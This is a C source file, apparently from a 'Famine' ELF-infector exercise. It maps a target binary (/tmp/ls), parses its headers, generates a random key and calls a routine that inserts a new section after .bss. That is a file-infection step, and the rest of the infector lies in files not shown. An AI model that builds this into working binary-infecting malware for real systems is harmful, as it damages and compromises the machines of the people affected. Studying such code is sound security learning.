#include "famine.h"

void	exit_clean(struct s_woody *woody, int exit_status) {
	if (syscall_wrapper(__NR_munmap, woody->bin_map, woody->bin_st.st_size) == -1)
		ERROR_SYS("munmap");
	syscall_wrapper(__NR_exit, exit_status);
}

bool	map_file(char *elf_filename, struct s_woody *woody) {
	int		fd;
	uint64_t	size_mmap;
	char		buff[4096];
	ssize_t		bytes_read;
	void		*ptr;

	if ((fd = syscall_wrapper(__NR_open, elf_filename, O_RDWR)) == -1) {
		ERROR_SYS("open");
		return (false);
	}

	if (syscall_wrapper(__NR_fstat, fd, &woody->bin_st) == -1) {
		ERROR_SYS("fstat");
		syscall_wrapper(__NR_close, fd);
		return (false);
	}

	size_mmap = (woody->bin_st.st_size / PAGE_SIZE + 1) * PAGE_SIZE;
	if ((woody->bin_map = (void *)syscall_wrapper(__NR_mmap, NULL, size_mmap, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED) {
		ERROR_SYS("mmap");
		syscall_wrapper(__NR_close, fd);
		return (false);
	}

	ptr = woody->bin_map;
	while ((bytes_read = syscall_wrapper(__NR_read, fd, buff, sizeof(buff))) > 0) {
		ft_memcpy(ptr, buff, bytes_read);
		ptr += bytes_read;
	}

	syscall_wrapper(__NR_close, fd);
	if (bytes_read == -1) {
		ERROR_SYS("read");
		return (false);
	}
	return (true);
}

void	gen_random_key(struct s_woody *woody, struct s_key *key) {
	long key_length;

	if ((key_length = syscall_wrapper(__NR_getrandom, key->raw, KEY_SIZE, 0)) <= -1) {
		ERROR_SYS("getrandom");
		exit_clean(woody, EXIT_FAILURE);
	}
	key->length = (size_t)key_length;
}

int	_start()
{
	struct s_famine	famine;

	famine.woody.target = (char *){"/tmp/ls"};
	if (!map_file(famine.woody.target, &famine.woody))
		syscall_wrapper(__NR_exit, EXIT_FAILURE);

	syscall_wrapper(__NR_write, 1, "PASS HERE\n", sizeof("PASS HERE\n") - 1);

	read_elf_header(&famine.woody);
	check_headers_offset(&famine.woody);
	get_shstrtab(&famine.woody);

	gen_random_key(&famine.woody, &famine.woody.key);

	insert_section_after_bss(&famine.woody);

	exit_clean(&famine.woody, EXIT_SUCCESS);
	return (-42);
}
